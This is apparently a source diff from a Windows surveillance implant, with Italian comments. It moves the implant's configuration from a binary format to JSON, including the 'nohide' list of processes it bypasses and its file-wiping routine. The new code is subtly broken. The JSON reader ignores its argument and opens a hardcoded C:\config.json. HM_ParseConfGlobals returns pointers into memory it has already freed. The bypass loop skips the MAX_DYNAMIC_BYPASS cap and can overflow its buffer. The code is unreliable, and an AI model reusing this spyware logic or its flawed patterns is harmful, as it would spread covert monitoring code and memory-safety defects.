@@ -1900,7 +1900,7 @@ void HM_WipeFileW(WCHAR *file_name)
 BOOL HM_CheckNewConf() 
 {
 	HANDLE h_conf_file;
-	BYTE *clear_file;
+	char *clear_file;
 	char conf_path[DLLNAMELEN];
 	char orig_conf_path[DLLNAMELEN];
 
@@ -1911,7 +1911,7 @@ BOOL HM_CheckNewConf()
 	CloseHandle(h_conf_file);
 
 	// Verifica che il file sia integro e decifrabile correttamente
-	clear_file = HM_ReadClearConf(H4_CONF_BU);
+	clear_file = HM_ReadClearConfBSON(H4_CONF_BU);
 	if (!clear_file) {
 		HM_WipeFileA(HM_CompletePath(H4_CONF_BU, conf_path));
 		return FALSE;
@@ -1940,6 +1940,19 @@ BOOL HM_CheckNewConf()
 	return TRUE;
 }
 
+char *HM_ReadClearConfBSON(char *conf_name)
+{
+	// XXX Da modificare
+#define SIZE_JSON 6000
+	char *conf_json;
+	DWORD readn;
+
+	conf_json = (char *)calloc(SIZE_JSON, 1);
+	HANDLE hfile = CreateFile("C:\\config.json", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
+	ReadFile(hfile, conf_json, SIZE_JSON, &readn, NULL);
+	CloseHandle(hfile);
+	return conf_json;
+}	
 
 // Ritorna una zona di memoria con il file di configurazione
 // in chiaro. Va liberata!!!. Torna NULL se fallisce.
@@ -2036,6 +2049,7 @@ BYTE *HM_ReadClearConf(char *conf_name)
 	return conf_memory_clear;
 }
 
+// Passa alla callback tutti i sotto-oggetti dell'oggetto "section" nella configurazione json
 typedef void (WINAPI *conf_callback_t)(JSONObject);
 BOOL HM_ParseConfSection(char *conf, WCHAR *section, conf_callback_t call_back)
 {
@@ -2062,13 +2076,35 @@ BOOL HM_ParseConfSection(char *conf, WCHAR *section, conf_callback_t call_back)
 	return TRUE;
 }
 
+// Torna l'oggetto json di tutta la configurazione
+BOOL HM_ParseConfGlobals(char *conf, JSONObject *obj)
+{
+	JSONValue *value;
+	JSONObject root;
+
+	value = JSON::Parse(conf);
+	if (!value)
+		return FALSE;
+	if (value->IsObject() == false) {
+		delete value;
+		return FALSE;
+	}
+	root = value->AsObject();
+	*obj = root[L"globals"]->AsObject();
+
+	delete value;
+	return TRUE;
+}
+
+
 // Legge le configurazioni globali
 void HM_UpdateGlobalConf()
 {
 	HANDLE h_conf_file;
 	DWORD readn;
+	JSONObject conf_json;
 	char conf_path[DLLNAMELEN];
-	BYTE *conf_memory;
+	char *conf_memory;
 
 	// Se non riesce a leggere la configurazione, inizializza comunque
 	// i valori globali.
@@ -2109,33 +2145,20 @@ void HM_UpdateGlobalConf()
 	Log_RestoreAgentState(PM_CORE, (BYTE *)&date_delta, sizeof(date_delta)); 
 
 	// Legge la lista dei processi da bypassare 
-	conf_memory = HM_ReadClearConf(H4_CONF_FILE);
-	
-	// Effettua il parsing del file di configurazione mappato
-	// XXX Non c'e' il controllo che conf_ptr possa uscire fuori dalle dimensioni del file mappato
-	// (viene assunto che la configurazione sia coerente e il file integro)
-	if (conf_memory) {
-		DWORD index, param_len;
-		BYTE *conf_ptr;
-
-		// conf_ptr si sposta nel file durante la lettura
-		conf_ptr = (BYTE *)HM_memstr((char *)conf_memory, BYPAS_CONF_DELIMITER);
-
-		// ---- Configurazione process bypass ----
-		READ_DWORD(process_bypassed, conf_ptr);
+	conf_memory = HM_ReadClearConfBSON(H4_CONF_FILE);
+	if (conf_memory && HM_ParseConfGlobals(conf_memory, &conf_json)) {
+		DWORD index;
+		JSONArray bypass_array = conf_json[L"nohide"]->AsArray();
+		DWORD process_bypassed = bypass_array.size();
 		if (process_bypassed > MAX_DYNAMIC_BYPASS)
 			process_bypassed = MAX_DYNAMIC_BYPASS;
 		process_bypassed += EMBEDDED_BYPASS; // Inserisce i processi hardcoded
 
 		// Legge i processi rimanenti dal file di configurazione
-		for (index=EMBEDDED_BYPASS; index<process_bypassed; index++) {
-			READ_DWORD(param_len, conf_ptr);
-			// Il nome dei processi deve essere NULL terminated
-			_snprintf_s(process_bypass_list[index], MAX_PBYPASS_LEN, _TRUNCATE, "%s", (char *)conf_ptr);
-			conf_ptr += param_len;
-		}
-		SAFE_FREE(conf_memory);
+		for (index=0; index<bypass_array.size(); index++) 
+			_snprintf_s(process_bypass_list[index+EMBEDDED_BYPASS], MAX_PBYPASS_LEN, _TRUNCATE, "%S", bypass_array[index]->AsString().c_str());
 	}
+	SAFE_FREE(conf_memory);
 }
 
 
